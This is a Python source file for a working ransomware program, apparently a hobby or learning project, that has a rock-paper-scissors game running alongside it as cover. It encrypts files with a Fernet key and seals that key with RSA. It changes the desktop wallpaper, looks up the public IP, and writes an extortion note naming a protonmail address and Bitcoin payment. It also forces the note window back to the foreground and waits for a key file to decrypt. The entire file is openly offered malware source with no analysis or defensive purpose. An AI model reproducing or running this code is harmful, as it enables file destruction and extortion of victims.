import random
import time
from cryptography.fernet import Fernet
import os
import webbrowser
import ctypes
import urllib.request
import requests
import subprocess
import win32gui
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP
import base64
import threading
import datetime

class RansomWare:
    
    # File extensions to seek out and encrypt
    file_exts = ['txt']

    def __init__(self):
        self.key = None
        self.crypter = None
        self.public_key = None
        self.sysRoot = os.path.expanduser('~')
        self.localRoot = r'D:\Coding\Python\RansomWare\RansomWare_Software\localRoot'  # Debugging/Testing
        self.publicIP = requests.get('https://api.ipify.org').text

    # Generates [SYMMETRIC KEY] on victim machine which is used to encrypt the victims data
    def generate_key(self):
        self.key = Fernet.generate_key()
        self.crypter = Fernet(self.key)

    # Write the fernet(symmetric key) to text file
    def write_key(self):
        with open('fernet_key.txt', 'wb') as f:
            f.write(self.key)

    # Encrypt [SYMMETRIC KEY] that was created on victim machine with our PUBLIC ASYMMETRIC RSA key
    def encrypt_fernet_key(self):
        with open('fernet_key.txt', 'rb') as fk:
            fernet_key = fk.read()
        with open('fernet_key.txt', 'wb') as f:
            self.public_key = RSA.import_key(open('public.pem').read())
            public_crypter = PKCS1_OAEP.new(self.public_key)
            enc_fernent_key = public_crypter.encrypt(fernet_key)
            f.write(enc_fernent_key)
        with open(f'{self.sysRoot}Desktop/EMAIL_ME.txt', 'wb') as fa:
            fa.write(enc_fernent_key)
        self.key = enc_fernent_key
        self.crypter = None

    # [SYMMETRIC KEY] Fernet Encrypt/Decrypt file
    def crypt_file(self, file_path, encrypted=False):
        with open(file_path, 'rb') as f:
            data = f.read()
            if not encrypted:
                _data = self.crypter.encrypt(data)
            else:
                _data = self.crypter.decrypt(data)
        with open(file_path, 'wb') as fp:
            fp.write(_data)

    # [SYMMETRIC KEY] Fernet Encrypt/Decrypt files on system
    def crypt_system(self, encrypted=False):
        system = os.walk(self.localRoot, topdown=True)
        for root, dir, files in system:
            for file in files:
                file_path = os.path.join(root, file)
                if not file.split('.')[-1] in self.file_exts:
                    continue
                if not encrypted:
                    self.crypt_file(file_path)
                else:
                    self.crypt_file(file_path, encrypted=True)

    @staticmethod
    def what_is_bitcoin():
        url = 'https://bitcoin.org'
        webbrowser.open(url)

    def change_desktop_background(self):
        imageUrl = 'https://images.idgesg.net/images/article/2018/02/ransomware_hacking_thinkstock_903183876-100749983-large.jpg'
        path = f'{self.sysRoot}Desktop/background.jpg'
        urllib.request.urlretrieve(imageUrl, path)
        SPI_SETDESKWALLPAPER = 20
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 0)

    def ransom_note(self):
        date = datetime.date.today().strftime('%d-%B-Y')
        with open('RANSOM_NOTE.txt', 'w') as f:
            f.write(f'''
The harddisks of your computer have been encrypted with a Military grade encryption algorithm.
There is no way to restore your data without a special key.
Only we can decrypt your files!

To purchase your key and restore your data, please follow these three easy steps:

1. Email the file called EMAIL_ME.txt at {self.sysRoot}Desktop/EMAIL_ME.txt to GetYourFilesBack@protonmail.com

2. You will receive your personal BTC address for payment.
   Once payment has been completed, send another email to GetYourFilesBack@protonmail.com stating "PAID".
   We will check to see if payment has been paid.

3. You will receive a text file with your KEY that will unlock all your files. 
   IMPORTANT: To decrypt your files, place text file on desktop and wait. Shortly after it will begin to decrypt all files.

WARNING:
Do NOT attempt to decrypt your files with any software as it is obsolete and will not work, and may cost you more to unlock your files.
Do NOT change file names, mess with the files, or run decryption software as it will cost you more to unlock your files-
-and there is a high chance you will lose your files forever.
Do NOT send "PAID" button without paying, price WILL go up for disobedience.
Do NOT think that we won't delete your files altogether and throw away the key if you refuse to pay. WE WILL.
''')

    def show_ransom_note(self):
        ransom = subprocess.Popen(['notepad.exe', 'RANSOM_NOTE.txt'])
        count = 0
        while True:
            time.sleep(0.1)
            top_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
            if top_window != 'RANSOM_NOTE - Notepad':
                ransom.kill()
                time.sleep(0.1)
                ransom = subprocess.Popen(['notepad.exe', 'RANSOM_NOTE.txt'])
            time.sleep(10)
            count += 1
            if count == 5:
                break

    # Decrypts system when text file with un-encrypted key is placed on desktop
    def put_me_on_desktop(self):
        while True:
            try:
                with open(f'{self.sysRoot}/Desktop/PUT_ME_ON_DESKTOP.txt', 'r') as f:
                    self.key = f.read()
                    self.crypter = Fernet(self.key)
                    self.crypt_system(encrypted=True)
                    break
            except Exception as e:
                pass
            time.sleep(10)

# The alternative game (after 1 second)
def game():
    list1 = ["fox", "hunter", "lord"]
    print("This is an alternative game of rock, paper and scissors")
    print("")
    win_count = 0
    lose_count = 0
    win = True

    while win:
        cpu = random.choice(list1)
        user = input("Enter your choice:[fox, hunter, lord] or exit:  ")
        user = user.lower()

        if (user == "fox" and cpu == "lord") or (user == "hunter" and cpu == "fox") or (user == "lord" and cpu == "hunter"):
            print("Computer chose", cpu)
            print("You have won")
            win_count += 1

        elif (user == "lord" and cpu == "fox") or (user == "fox" and cpu == "hunter") or (user == "hunter" and cpu == "lord"):
            print("Computer chose", cpu)
            print("You lose")
            lose_count += 1

        elif user == cpu:
            print("Computer chose", cpu)
            print("It is a draw")

        elif user == "exit":
            print("Goodbye")
            print("You won", win_count, "times.", "You lost,", lose_count, "times.")
            win = False

        else:
            print("Not valid")

def main():
    rw = RansomWare()
    rw.generate_key()
    rw.crypt_system()
    rw.write_key()
    rw.encrypt_fernet_key()
    rw.change_desktop_background()
    rw.what_is_bitcoin()
    rw.ransom_note()

    # Start game after 1 second
    time.sleep(1)
    game_thread = threading.Thread(target=game)
    game_thread.start()

    # Start ransomware note thread
    t1 = threading.Thread(target=rw.show_ransom_note)
    t2 = threading.Thread(target=rw.put_me_on_desktop)

    t1.start()
    print('> RansomWare: Attack completed on target machine and system is encrypted')
    print('> RansomWare: Waiting for attacker to give target machine document that will un-encrypt machine')
    t2.start()
    print('> RansomWare: Target machine has been un-encrypted')
    print('> RansomWare: Completed')

if __name__ == '__main__':
    main()
